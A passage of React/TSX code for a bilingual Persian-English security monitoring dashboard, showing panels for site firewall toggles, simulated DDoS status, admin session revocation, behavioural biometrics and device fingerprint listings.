                              <h3 className="font-mono text-base font-bold text-white flex items-center gap-2">
                                <Globe className="w-4 h-4 text-emerald-400" />
                                {selectedSite.domain}
                                <span className="text-[10px] text-slate-500 font-normal">
                                  ({isRtl ? "وضعیت زنده" : "Live Profile"})
                                </span>
                              </h3>
                              <p className="text-xs text-slate-500 mt-1">
                                {isRtl 
                                  ? `شناسه سیستم پایش: ${selectedSite.id} • ثبت شده در ${new Date(selectedSite.createdAt).toLocaleDateString("fa-IR")}` 
                                  : `System Watchpoint: ${selectedSite.id} • Added on ${new Date(selectedSite.createdAt).toLocaleDateString()}`}
                              </p>
                            </div>
                            
                            <div className="flex flex-col items-end gap-1.5">
                              {selectedSite.status === "ACTIVE & SECURED" && (
                                <span className="px-2.5 py-1 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-mono text-[10px] font-extrabold uppercase tracking-wide">
                                  ACTIVE & SECURED 🟢
                                </span>
                              )}
                              {selectedSite.status === "UNDER_ATTACK" && (
                                <span className="px-2.5 py-1 bg-rose-500/10 text-rose-400 border border-rose-500/20 rounded font-mono text-[10px] font-extrabold uppercase tracking-wide animate-pulse">
                                  UNDER DDoS ATTACK ⚠️
                                </span>
                              )}
                              {selectedSite.status === "OFFLINE" && (
                                <span className="px-2.5 py-1 bg-slate-500/10 text-slate-400 border border-slate-500/20 rounded font-mono text-[10px] font-extrabold uppercase tracking-wide animate-pulse">
                                  OFFLINE / TIMEOUT ❌
                                </span>
                              )}
                              {selectedSite.latency > 0 && (
                                <div className="text-[10px] text-slate-400 font-mono">
                                  {isRtl ? "پاسخ لتنسی:" : "Response latency:"} <strong className={selectedSite.status === "UNDER_ATTACK" ? "text-rose-400" : "text-emerald-400"}>{selectedSite.latency} ms</strong>
                                </div>
                              )}
                            </div>
                          </div>

                          {/* ACTION PANEL: LIVE STATE CONTROL BUTTONS */}
                          <div className="p-4 bg-slate-950/40 border border-dash-border/30 rounded-xl space-y-3">
                            <h4 className="text-[11px] font-extrabold text-indigo-400 uppercase tracking-wider flex items-center gap-1.5">
                              <Sliders className="w-3 h-3" />
                              {isRtl ? "شبیه‌ساز و کنترل وضعیت پدافند سایت" : "Live Security Traffic Simulator"}
                            </h4>
                            <p className="text-[10px] text-slate-400">
                              {isRtl 
                                ? "تغییر لحظه‌ای وضعیت ترافیک ورودی سایت برای تست سناریوهای فایروال و دفاع هوشمند" 
                                : "Manually switch the operational status flow to simulate DDoS routing or maintenance limits."}
                            </p>
                            <div className="grid grid-cols-3 gap-2 text-center text-xs font-mono pt-1">
                              <button
                                type="button"
                                onClick={() => setSiteStatus(selectedSite.id, "ACTIVE & SECURED")}
                                className={cn(
                                  "py-1.5 rounded transition-all text-[10px] font-bold uppercase",
                                  selectedSite.status === "ACTIVE & SECURED"
                                    ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40"
                                    : "bg-slate-900 border border-slate-800 text-slate-400 hover:bg-slate-800"
                                )}
                              >
                                {isRtl ? "عادی و ایمن" : "Secured"}
                              </button>
                              <button
                                type="button"
                                onClick={() => setSiteStatus(selectedSite.id, "UNDER_ATTACK")}
                                className={cn(
                                  "py-1.5 rounded transition-all text-[10px] font-bold uppercase",
                                  selectedSite.status === "UNDER_ATTACK"
                                    ? "bg-rose-500/20 text-rose-400 border border-rose-500/40 animate-pulse"
                                    : "bg-slate-900 border border-slate-800 text-slate-400 hover:bg-slate-800"
                                )}
                              >
                                {isRtl ? "شبیه‌ساز حمله" : "DDoS Attack"}
                              </button>
                              <button
                                type="button"
                                onClick={() => setSiteStatus(selectedSite.id, "OFFLINE")}
                                className={cn(
                                  "py-1.5 rounded transition-all text-[10px] font-bold uppercase",
                                  selectedSite.status === "OFFLINE"
                                    ? "bg-slate-500/20 text-slate-400 border border-slate-500/40"
                                    : "bg-slate-900 border border-slate-800 text-slate-400 hover:bg-slate-800"
                                )}
                              >
                                {isRtl ? "قطع کامل" : "Offline Link"}
                              </button>
                            </div>
                          </div>

                          {/* Tech metrics WHOIS detail grids */}
                          <div className="grid grid-cols-2 md:grid-cols-3 gap-3 text-xs font-mono">
                            <div className="p-3 bg-slate-950/50 rounded-lg">
                              <div className="text-slate-500 text-[10px]">{isRtl ? "ریجسترار دامنه" : "REGISTRAR"}</div>
                              <div className="text-slate-200 font-bold truncate mt-0.5">{selectedSite.registrar}</div>
                            </div>
                            <div className="p-3 bg-slate-950/50 rounded-lg">
                              <div className="text-slate-500 text-[10px]">{isRtl ? "گواهی امنیت مبدا" : "SSL ENCRYPTION"}</div>
                              <div className="text-emerald-400 font-bold truncate mt-0.5">{selectedSite.ssl}</div>
                            </div>
                            <div className="col-span-2 md:col-span-1 p-3 bg-slate-950/50 rounded-lg">
                              <div className="text-slate-500 text-[10px]">{isRtl ? "شناسه هاست گیت‌وی" : "A IP POINTER"}</div>
                              <div className="text-indigo-400 font-bold mt-0.5">{selectedSite.dnsA}</div>
                            </div>
                          </div>

                          {/* SECURITY ENGINE SWITCHES COORPORATION */}
                          <div className="bg-slate-950/30 border border-dash-border/30 rounded-xl p-4 space-y-3 text-xs">
                            <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                              {isRtl ? "پیکربندی قوانین سپر دفاعی امنیتی" : "PROACTIVE FIREWALL SHIELD CONTROLS"}
                            </h4>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-1">
                              
                              {/* WAF Switch */}
                              <div className="p-3 bg-slate-950/60 rounded-lg border border-slate-900 flex items-center justify-between">
                                <div className="space-y-0.5">
                                  <span className="text-slate-220 font-bold block">{isRtl ? "فایروال پایش برنامه (WAF)" : "WAF Firewall Filtering"}</span>
                                  <span className="text-[9px] text-slate-500 block">{isRtl ? "مسدودسازی هوشمند اکسپلویت‌ها" : "Block zero-day Layer 7 exploits"}</span>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => toggleSiteFlag(selectedSite.id, "wafEnabled")}
                                  className={cn(
                                    "px-2.5 py-1 text-[9px] uppercase font-bold rounded border tracking-wider font-mono transition-all",
                                    selectedSite.wafEnabled
                                      ? "bg-emerald-500/10 border-emerald-500/40 text-emerald-400 font-extrabold"
                                      : "bg-rose-500/10 border-rose-500/40 text-rose-400 font-extrabold"
                                  )}
                                >
                                  {selectedSite.wafEnabled ? "WAF: ACTIVE" : "WAF: BYPASS"}
                                </button>
                              </div>

                              {/* DDoS Shield Switch */}
                              <div className="p-3 bg-slate-950/60 rounded-lg border border-slate-900 flex items-center justify-between">
                                <div className="space-y-0.5">
                                  <span className="text-slate-220 font-bold block">{isRtl ? "سپر حفاظت لایو DDoS" : "DDoS Storm Filtering"}</span>
                                  <span className="text-[9px] text-slate-500 block">{isRtl ? "فیلتر بانیلا ترافیک ربات‌ها" : "Mitigate connection spikes"}</span>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => toggleSiteFlag(selectedSite.id, "ddosEnabled")}
                                  className={cn(
                                    "px-2.5 py-1 text-[9px] uppercase font-bold rounded border tracking-wider font-mono transition-all",
                                    selectedSite.ddosEnabled
                                      ? "bg-emerald-500/10 border-emerald-500/40 text-emerald-400 font-extrabold"
                                      : "bg-rose-500/10 border-rose-500/40 text-rose-400 font-extrabold"
                                  )}
                                >
                                  {selectedSite.ddosEnabled ? "DDoS: ENGAGED" : "DDoS: OFF"}
                                </button>
                              </div>

                              {/* DNSSEC Sign Switch */}
                              <div className="p-3 bg-slate-950/60 rounded-lg border border-slate-900 flex items-center justify-between">
                                <div className="space-y-0.5">
                                  <span className="text-slate-220 font-bold block">{isRtl ? "امضای هویت DNSSEC" : "DNSSEC Cryptographic Signing"}</span>
                                  <span className="text-[9px] text-slate-500 block">{isRtl ? "جلوگیری از مسموم‌سازی کش DNS" : "Encrypt pointers tracking signatures"}</span>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => toggleSiteFlag(selectedSite.id, "dnssecEnabled")}
                                  className={cn(
                                    "px-2.5 py-1 text-[9px] uppercase font-bold rounded border tracking-wider font-mono transition-all",
                                    selectedSite.dnssecEnabled
                                      ? "bg-emerald-500/10 border-emerald-500/40 text-emerald-400 font-extrabold"
                                      : "bg-rose-500/10 border-rose-500/40 text-rose-400 font-extrabold"
                                  )}
                                >
                                  {selectedSite.dnssecEnabled ? "SECURE" : "UNRESOLVED"}
                                </button>
                              </div>

                              {/* SSL Required Switch */}
                              <div className="p-3 bg-slate-950/60 rounded-lg border border-slate-900 flex items-center justify-between">
                                <div className="space-y-0.5">
                                  <span className="text-slate-220 font-bold block">{isRtl ? "اجبار به اتصال امن HSTS" : "SSL Strict Enforcer (HSTS)"}</span>
                                  <span className="text-[9px] text-slate-500 block">{isRtl ? "هدایت اجباری HTTP به HTTPS" : "Deny plaintext tunnels"}</span>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => toggleSiteFlag(selectedSite.id, "sslEnforced")}
                                  className={cn(
                                    "px-2.5 py-1 text-[9px] uppercase font-bold rounded border tracking-wider font-mono transition-all",
                                    selectedSite.sslEnforced
                                      ? "bg-emerald-500/10 border-emerald-500/40 text-emerald-400 font-extrabold"
                                      : "bg-rose-500/10 border-rose-500/40 text-rose-400 font-extrabold"
                                  )}
                                >
                                  {selectedSite.sslEnforced ? "HSTS: ON" : "HSTS: BYPASS"}
                                </button>
                              </div>

                            </div>
                          </div>

                          {/* Dynamic Security DNS records */}
                          <div className="p-4 bg-slate-950/60 rounded-xl space-y-2 font-mono text-[11px]">
                            <h4 className="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2 flex items-center gap-1">
                              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                              {isRtl ? "نقشه رکوردهای معتبر DNS دامنه" : "Verified Security DNS Resource Records"}
                            </h4>
                            <div className="space-y-2">
                              {[
                                { t: "A Record", val: selectedSite.dnsA, isSec: isRtl ? "تایید شده" : "Verified Pointer" },
                                { t: "MX Record", val: selectedSite.dnsMx, isSec: isRtl ? "فعال" : "Active Ingress" },
                                { t: "TXT (SPF)", val: selectedSite.dnsSpf, isSec: "PASS 🟢" },
                                { t: "TXT (DMARC)", val: selectedSite.dnsDmarc, isSec: "PASS 🟢" },
                              ].map((dns, i) => (
                                <div key={i} className="flex flex-col md:flex-row md:items-center justify-between border-b border-slate-900 pb-1.5 last:border-b-0 last:pb-0">
                                  <div className="flex items-start gap-2">
                                    <span className="bg-slate-900 border border-slate-800 text-slate-400 text-[9px] px-1 font-bold rounded w-16 text-center shrink-0">{dns.t}</span>
                                    <span className="text-slate-300 font-mono text-[10px] truncate max-w-sm">{dns.val}</span>
                                  </div>
                                  <span className="text-emerald-400 text-[10px] font-bold mt-1 md:mt-0">{dns.isSec}</span>
                                </div>
                              ))}
                            </div>
                          </div>

                        </div>
                      ) : (
                        <div className="bg-dash-panel border border-dash-border rounded-xl p-8 text-center text-slate-500 font-mono">
                          {isRtl ? "[لطفا یک سایت برای پایش انتخاب کنید]" : "[Select a website to load metrics matrix]"}
                        </div>
                      )}
                    </div>

                  </div>
                </div>
              );
            })()}
          </div>
        </div>
      </div>
    );
  }

  // 4) SUBVIEW: SESSIONS SECURITY (SEPARATED)
  if (activeTab === "sessions") {
    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Clock className="w-5 h-5 text-indigo-400" />
              {isRtl ? "پنل پایش نشست‌های ادمین و کاربران" : "Verified Security Sessions Guard"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "مدیریت لایو نشست‌ها، بررسی سطح دسترسی‌های صادر شده کلید سخت‌افزاری و دسترسی‌ها" 
                : "Manage operational tokens, view device bindings, and revoke rogue sessions instantly."}
            </p>
          </div>
        </div>

        {sessionSuccessMsg && (
          <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4 animate-bounce" />
            {sessionSuccessMsg}
          </div>
        )}

        <div className="bg-dash-panel border border-dash-border rounded-xl p-5 overflow-hidden">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4 border-b border-dash-border/20 pb-4">
            <h3 className="text-sm font-semibold text-slate-200">
              {isRtl ? "نشست‌های فعال تایید شده فایروال" : "Active Tunnel Admin Sessions"}
            </h3>
            <div className="text-xs text-slate-400 font-mono">
              {isRtl ? `مجموع نشست‌های فعال: ${sessionList.length}` : `TOTAL CONCURRENT ASYNC TUNNELS: ${sessionList.length}`}
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left ltr:text-left rtl:text-right text-xs">
              <thead>
                <tr className="text-slate-500 uppercase font-bold border-b border-dash-border/60 pb-2">
                  <th className="pb-3">{isRtl ? "کاربر" : "Session User"}</th>
                  <th className="pb-3">{isRtl ? "سیستم‌عامل و مرورگر" : "Client Agent & OS"}</th>
                  <th className="pb-3">{isRtl ? "آدرس آی‌پی" : "IP Address"}</th>
                  <th className="pb-3">{isRtl ? "سطح دسترسی" : "Security Level"}</th>
                  <th className="pb-3">{isRtl ? "امتیاز اعتماد" : "Trust Integrity"}</th>
                  <th className="pb-3 text-center">{isRtl ? "اقدام امنیتی" : "Evict"}</th>
                </tr>
              </thead>
              <tbody className="text-slate-300 divide-y divide-dash-border/40">
                {sessionList.map((ses) => (
                  <tr key={ses.id} className="hover:bg-slate-800/10 transition-colors">
                    <td className="py-3 flex items-center gap-2.5">
                      <img src={ses.avatar} alt={ses.user} className="w-6 h-6 rounded-full border border-slate-700" referrerPolicy="no-referrer" />
                      <div>
                        <span className="font-bold text-slate-200 block">{ses.user}</span>
                        <span className="text-[10px] text-slate-500 font-mono">ID: {ses.id}</span>
                      </div>
                    </td>
                    <td className="py-3 font-mono text-slate-400">{ses.os}</td>
                    <td className="py-3 font-mono text-indigo-400">{ses.ip}</td>
                    <td className="py-3">
                      <span className="bg-indigo-950/50 border border-indigo-500/30 text-indigo-400 px-2 py-0.5 rounded uppercase text-[10px] font-bold">
                        {ses.role}
                      </span>
                    </td>
                    <td className="py-3 font-mono">
                      <div className="flex items-center gap-2">
                        <div className="w-16 bg-slate-800 rounded-full h-1.5 overflow-hidden">
                          <div 
                            className={cn("h-full rounded-full", ses.trust > 80 ? "bg-emerald-500" : "bg-amber-500")}
                            style={{ width: `${ses.trust}%` }}
                          />
                        </div>
                        <span className={cn("font-bold", ses.trust > 80 ? "text-emerald-400" : "text-amber-400")}>
                          {ses.trust}%
                        </span>
                      </div>
                    </td>
                    <td className="py-3 text-center">
                      <button
                        onClick={() => handleKillSession(ses.id, ses.user)}
                        className="px-2.5 py-1 rounded bg-rose-500/10 hover:bg-rose-600/25 text-rose-400 text-[10px] uppercase font-mono font-bold border border-rose-500/20 cursor-pointer"
                      >
                        {isRtl ? "اخراج" : "REVOKE"}
                      </button>
                    </td>
                  </tr>
                ))}
                {sessionList.length === 0 && (
                  <tr>
                    <td colSpan={6} className="py-12 text-center text-slate-500 font-mono">
                      {isRtl ? "[تمامی رکوردهای دسترسی و نشست‌ها لغو شده‌اند]" : "[All administrative tokens physically revoked]"}
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  }

  // ADVANCED BEHAVIORAL ANALYTICS SUBVIEW
  if (activeTab === "behaviorAnalytics") {
    const handleSimulateBehaviorShift = () => {
      setBehavioralUsers(prev => prev.map(u => {
        if (u.id === "b2") {
          const newSpeedNum = Math.floor(250 + Math.random() * 150);
          const newScore = Math.floor(40 + Math.random() * 50);
          const words = [
            { name: "k1", val: 50 + Math.random() * 40 },
            { name: "k2", val: 40 + Math.random() * 50 },
            { name: "k3", val: 60 + Math.random() * 40 },
            { name: "k4", val: 45 + Math.random() * 30 },
            { name: "k5", val: 55 + Math.random() * 40 }
          ];
          return {
            ...u,
            typingSpeed: `${newSpeedNum} CPM (${newSpeedNum > 340 ? "Anomaly Rapid" : "Dynamic Fast"})`,
            keystrokeFlightTime: Math.floor(40 + Math.random() * 70),
            mouseEntropy: parseFloat((2.0 + Math.random() * 1.5).toFixed(2)),
            riskScore: newScore,
            status: newScore > 75 ? "HIGH RISK ANOMALY" : "SUSPICIOUS",
            statusFa: newScore > 75 ? "تهدید آنومالی رفتاری" : "مشکوک",
            keystrokeData: words
          };
        }
        return u;
      }));

      setBehaviorMsg(
        isRtl 
          ? "تغییر سیگنال رفتاری و کپی کلیک شبیه‌سازی شد! آنالایزر متغیر جدید را ذخیره کرد." 
          : "Behavioral biometrics shift simulated. Aggregated scores recalculated."
      );
      setTimeout(() => setBehaviorMsg(""), 3000);
    };

    const currentUserData = behavioralUsers.find(k => k.id === selectedBehavioralUser) || behavioralUsers[0];

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Users className="w-5 h-5 text-indigo-400" />
              {isRtl ? "سیستم آنالیز رفتاری و بیومتریک پویای کاربر" : "Dynamic Behavioral Biometrics Engine"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "بررسی بلادرنگ نحوه تایپ کلمات، سرعت زدن کلیدها و الگوی حرکت ماوس جهت تشخیص بات‌ها" 
                : "Continuous endpoint analysis monitoring typing telemetry, mouse cadence, and robotic flight times."}
            </p>
          </div>
          <button
            onClick={handleSimulateBehaviorShift}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 self-start cursor-pointer transition-all shadow-[0_0_12px_rgba(79,70,229,0.3)]"
          >
            <Zap className="w-3.5 h-3.5 animate-pulse" />
            {isRtl ? "شبیه‌سازی انحراف الگوی رفتاری" : "Simulate Biometrics Shift"}
          </button>
        </div>

        {behaviorMsg && (
          <div className="p-3 bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {behaviorMsg}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* User selector cards */}
          <div className="lg:col-span-5 space-y-3">
            <h3 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">
              {isRtl ? "کاربران تحت مانیتورینگ بیومتریک" : "Monitored Behavioral Targets"}
            </h3>

            {behavioralUsers.map((item) => (
              <div
                key={item.id}
                onClick={() => setSelectedBehavioralUser(item.id)}
                className={cn(
                  "p-4 rounded-xl border transition-all cursor-pointer flex items-center justify-between gap-4",
                  selectedBehavioralUser === item.id
                    ? "bg-indigo-600/10 border-indigo-500/50 text-white"
                    : "bg-dash-panel border-dash-border text-slate-400 hover:border-slate-800"
                )}
              >
                <div className="flex items-center gap-3">
                  <img src={item.avatar} alt={item.user} className="w-8 h-8 rounded-full border border-slate-700" referrerPolicy="no-referrer" />
                  <div>
                    <h4 className="text-xs font-bold text-slate-200">{item.user}</h4>
                    <span className="text-[10px] text-slate-500 font-mono">{item.role}</span>
                  </div>
                </div>

                <div className="text-left ltr:text-right">
                  <div className={cn(
                    "font-mono text-xs font-bold",
                    item.riskScore > 70 ? "text-rose-400" : item.riskScore > 40 ? "text-amber-400" : "text-emerald-400"
                  )}>
                    RISK: {item.riskScore}%
                  </div>
                  <span className="text-[9px] bg-slate-900 border border-slate-800 px-1.5 py-0.5 rounded uppercase font-bold text-slate-500 block mt-1">
                    {isRtl ? item.statusFa : item.status}
                  </span>
                </div>
              </div>
            ))}
          </div>

          {/* Biometrics charts & data sheet */}
          <div className="lg:col-span-7 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 space-y-5">
              <div className="border-b border-dash-border/40 pb-3 flex justify-between items-center">
                <div>
                  <h3 className="text-sm font-bold text-slate-200 flex items-center gap-1.5">
                    <Activity className="w-4 h-4 text-indigo-400" />
                    <span>{isRtl ? `جزئیات تداخل بیومتریک: ${currentUserData.user}` : `Biometric Signals Analysis: ${currentUserData.user}`}</span>
                  </h3>
                  <span className="text-[10px] text-slate-500 font-mono uppercase">Telemetry Node ID: {currentUserData.id}619X</span>
                </div>
                <span className={cn(
                  "px-2 py-0.5 rounded text-[10px] font-mono font-bold",
                  currentUserData.riskScore > 75 ? "bg-rose-500/15 text-rose-400" : "bg-emerald-500/15 text-emerald-400"
                )}>
                  {currentUserData.riskScore > 75 ? "HIGH PENALTY CRITICAL" : "STABLE ACCORD"}
                </span>
              </div>

              {/* Details Metrics grid */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-900 text-right ltr:text-left">
                  <span className="text-[10px] text-slate-500 uppercase block">{isRtl ? "سرعت تایپ" : "Typing Cadence"}</span>
                  <span className="text-xs font-bold text-slate-200 block mt-0.5 font-mono truncate">{currentUserData.typingSpeed}</span>
                </div>
                <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-900 text-right ltr:text-left">
                  <span className="text-[10px] text-slate-500 uppercase block">{isRtl ? "پرواز کلید (Key Flight)" : "Key Flight Delay"}</span>
                  <span className="text-xs font-bold text-slate-205 block mt-0.5 font-mono text-indigo-400">{currentUserData.keystrokeFlightTime} ms</span>
                </div>
                <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-900 text-right ltr:text-left">
                  <span className="text-[10px] text-slate-500 uppercase block">{isRtl ? "لرزش حرکتی ماوس" : "Mouse Cadence Jitter"}</span>
                  <span className="text-xs font-bold text-slate-200 block mt-0.5 truncate">{currentUserData.mouseJitter}</span>
                </div>
                <div className="bg-slate-950 p-2.5 rounded-lg border border-slate-900 text-right ltr:text-left">
                  <span className="text-[10px] text-slate-500 uppercase block">{isRtl ? "آنتروپی کلیک و هندسه" : "Mouse Vector Entropy"}</span>
                  <span className="text-xs font-bold text-slate-200 block mt-0.5 font-mono text-emerald-400">{currentUserData.mouseEntropy}</span>
                </div>
              </div>

              {/* Keystroke Flight timing chart */}
              <div className="pt-2">
                <h4 className="text-xs font-bold text-slate-400 mb-2 font-mono">
                  {isRtl ? "تغییرات پویای تاخیر دکمه‌ها در ثانیه" : "Active Keypress Intervals Sequence (Sample flight time)"}
                </h4>
                <div className="w-full h-32 bg-slate-950/60 rounded-lg p-2 border border-slate-900">
                  <ResponsiveContainer width="100%" height="100%">
                    <LineChart data={currentUserData.keystrokeData}>
                      <CartesianGrid strokeDasharray="3 3" stroke="#161b22" />
                      <XAxis dataKey="name" stroke="#475569" fontSize={9} />
                      <YAxis stroke="#475569" fontSize={9} unit="ms" />
                      <Tooltip contentStyle={{ backgroundColor: "#06080c", color: "#fff", border: "0" }} />
                      <Line type="monotone" dataKey="val" stroke="#6366f1" strokeWidth={2.5} dot={{ fill: "#6366f1", r: 3 }} />
                    </LineChart>
                  </ResponsiveContainer>
                </div>
              </div>

              {/* Informative text */}
              <div className="p-3 bg-slate-950 border border-slate-900 rounded-lg text-[11px] text-slate-500 leading-relaxed">
                {isRtl 
                  ? "💡 موتور تحلیلی با بررسی الگوهای دکمه‌ها و زمان پرواز کلید، بلافاصله اسکریپت‌های اتوماتیک سلنیوم یا بات‌های سایبری را تشخیص می‌دهد زیرا بات‌ها تایپ را با گپ‌های بیومتریک و زمانی دقیقاً ثابت انجام می‌دهند."
                  : "💡 Humans carry high typing jitter and biological mouse entropy, while botnet relays or headless puppeteer drivers exhibit flat, machine-precise intervals of 0.0ms flight latency which are instantly blocked."}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // DEVICE FINGERPRINTS SUBVIEW
  if (activeTab === "deviceFingerprints") {
    const handleReverifyFingerprint = (id: string, name: string) => {
      setDeviceSuccessMsg(
        isRtl 
          ? `امضای سخت‌افزاری مرورگر کلاینت ${name} با موفقیت در جدول روتینگ فایروال به‌روزرسانی شد.` 
          : `Crypto-signature for client ${name} refreshed in memory cache.`
      );
      setTimeout(() => setDeviceSuccessMsg(""), 3000);
    };

    const handleToggleTrusted = (id: string) => {
      setDeviceFingerprintsList(prev => prev.map(d => {
        if (d.id === id) {
          const wasTrusted = d.trusted === "Trusted Device";
          return {
            ...d,
            trusted: wasTrusted ? "Unverified Device" : "Trusted Device",
            trustedFa: wasTrusted ? "بررسی نشده" : "مورد اعتماد",
            riskScore: wasTrusted ? 45 : 4
          };
        }
        return d;
      }));
    };

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Smartphone className="w-5 h-5 text-indigo-400" />
              {isRtl ? "سوابق و کاتالوگ اثر انگشت سخت‌افزاری دستگاه‌ها" : "Device Hardware Fingerprint Registry"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "شناسایی کلاینت‌ها بر اساس توابع درختی بوم مرورگر، پردازنده‌ی گرافیکی WebGL و متغیرهای صوتی رمزگذاری‌شده" 
                : "Identify and track client profiles using modern canvas hash rendering, WebGL context, and strict audio-fingerprint arrays."}
            </p>
          </div>
        </div>

        {deviceSuccessMsg && (
          <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {deviceSuccessMsg}
          </div>
        )}

        <div className="grid grid-cols-1 gap-6">
          <div className="bg-dash-panel border border-dash-border rounded-xl p-5 overflow-hidden">
            <h3 className="text-sm font-semibold text-slate-200 mb-4">
              {isRtl ? "مرورگرها و سیستم‌های رجیستر شده در هسته پروکسی" : "Registered Client Hardware Profiles"}
            </h3>

            <div className="overflow-x-auto">
              <table className="w-full text-left ltr:text-left rtl:text-right text-xs">
                <thead>
                  <tr className="text-slate-500 uppercase font-bold border-b border-dash-border/60 pb-2.5">
                    <th className="pb-3">{isRtl ? "صاحب دستگاه" : "Owner"}</th>
                    <th className="pb-3">{isRtl ? "مدل دستگاه" : "Platform Model"}</th>
                    <th className="pb-3 font-mono">Canvas Hash (2D)</th>
                    <th className="pb-3 font-mono">WebGL GPU Vendor</th>
                    <th className="pb-3 font-mono">Confidence Level</th>
                    <th className="pb-3">{isRtl ? "موقعیت / کشور" : "Active Loc"}</th>
                    <th className="pb-3 text-center">{isRtl ? "تغییر وضعیت اعتماد" : "Trust Action"}</th>
                    <th className="pb-3 text-center">{isRtl ? "بررسی" : "Diagnostics"}</th>
                  </tr>
                </thead>
                <tbody className="text-slate-300 divide-y divide-dash-border/40">
                  {deviceFingerprintsList.map((dev) => (
                    <tr key={dev.id} className="hover:bg-slate-800/10 transition-all">
                      <td className="py-4">
                        <span className="font-bold text-slate-200 block">{dev.owner}</span>
                        <span className="text-[10px] text-slate-500 font-mono">ID: {dev.id}</span>
                      </td>
                      <td className="py-4">
                        <span className="text-slate-200 font-medium block">{dev.deviceModel}</span>
                        <span className="text-[10px] text-slate-400">{dev.os} • {dev.browser}</span>
                      </td>
                      <td className="py-4 font-mono font-bold text-slate-400 text-[11px]">{dev.canvasHash}</td>
                      <td className="py-4 font-mono text-slate-500 text-[11px] truncate max-w-[150px]">{dev.webGlRenderer}</td>
                      <td className="py-4 font-mono">
                        <span className="px-1.5 py-0.5 rounded bg-indigo-950 border border-indigo-900/30 text-indigo-400 font-bold text-[10px]">
                          {dev.confidence} MATCH
                        </span>
                      </td>
                      <td className="py-4 text-[11px]">{dev.timezoneCountry}</td>
                      <td className="py-4 text-center">
                        <button
                          onClick={() => handleToggleTrusted(dev.id)}
                          className={cn(
                            "px-2 py-0.5 rounded text-[10px] cursor-pointer font-bold border transition-colors",
                            dev.trusted === "Trusted Device"
                              ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20 hover:bg-emerald-500/20"
                              : dev.trusted === "Flagged & Blocked"
                                ? "bg-rose-500/10 text-rose-400 border-rose-500/20 hover:bg-rose-500/20"
                                : "bg-amber-500/10 text-amber-400 border-amber-500/20 hover:bg-amber-500/20"
                          )}
                        >
                          {isRtl ? dev.trustedFa : dev.trusted}
                        </button>
                      </td>
                      <td className="py-4 text-center">
                        <button
                          onClick={() => handleReverifyFingerprint(dev.id, dev.owner)}
                          className="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 font-mono text-[10px] font-bold border border-slate-700 cursor-pointer"
                        >
                          FLUSH
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // USER JOURNEYS TIMELINE SUBVIEW
  if (activeTab === "userJourneys") {
    const handleReverifyStepMfa = (actionName: string) => {
      setJourneySuccessMsg(
        isRtl 
          ? `درخواست چالش تایید وریفای پاسخ MFA گیت‌وی صادر شد برای عمل: ${actionName}` 
          : `Ad-hoc Step-Up MFA Challenge successfully dispatched for: ${actionName}`
      );
      setTimeout(() => setJourneySuccessMsg(""), 3000);
    };

    const activeJourney = userJourneysList.find(y => y.id === selectedJourneyUser) || userJourneysList[0];

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex flex-col sm:flex-row justify-between sm:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Route className="w-5 h-5 text-indigo-400" />
              {isRtl ? "نقشه سفر و توالی زمانی گام‌های کاربر" : "Live User Session Journey Timeline"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
